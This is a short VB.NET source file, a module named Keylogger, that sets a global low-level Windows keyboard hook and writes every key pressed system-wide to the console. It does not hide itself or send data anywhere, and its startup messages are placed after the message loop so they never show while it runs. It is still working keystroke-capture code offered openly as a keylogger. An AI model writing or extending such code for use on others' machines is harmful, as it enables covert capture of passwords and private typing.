Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Module Keylogger

    Sub Main()
        hookID = SetHook(_proc)
        Application.Run()
        Console.WriteLine("Started Keylogger... ")
        Console.WriteLine("All keystrokes will be shown here")
        Console.WriteLine("Press CTRL + C if want to exit.")
    End Sub

    Function SetHook(proc As LowLevelKeyboardProc) As IntPtr
        Using curProcess As Process = Process.GetCurrentProcess()
            Using curModule As ProcessModule = curProcess.MainModule
                Return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0UI)
            End Using
        End Using
    End Function

    Function HookCallback(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
        If nCode >= 0 And wParam = 256 Then
            Dim vkCode As Integer = Marshal.ReadInt32(lParam)
            Console.Write(CType(vkCode, Keys).ToString())
        End If
        Return CallNextHookEx(hookID, nCode, wParam, lParam)
    End Function

    Declare Auto Function SetWindowsHookEx Lib "user32.dll" (idHook As Integer, lpfn As LowLevelKeyboardProc, hMod As IntPtr, dwThreadId As UInteger) As IntPtr
    Declare Auto Function UnhookWindowsHookEx Lib "user32.dll" (hhk As IntPtr) As Boolean
    Declare Auto Function CallNextHookEx Lib "user32.dll" (hhk As IntPtr, nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
    Declare Auto Function GetModuleHandle Lib "kernel32.dll" (lpModuleName As String) As IntPtr
    Const WH_KEYBOARD_LL As Integer = 13
    Const WM_KEYDOWN As Integer = 256
    Const WM_KEYUP As Integer = 257
    Private _proc As LowLevelKeyboardProc = AddressOf HookCallback
    Private hookID As IntPtr = IntPtr.Zero
    Private CONTROL_DOWN As Boolean = False
    Delegate Function LowLevelKeyboardProc(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
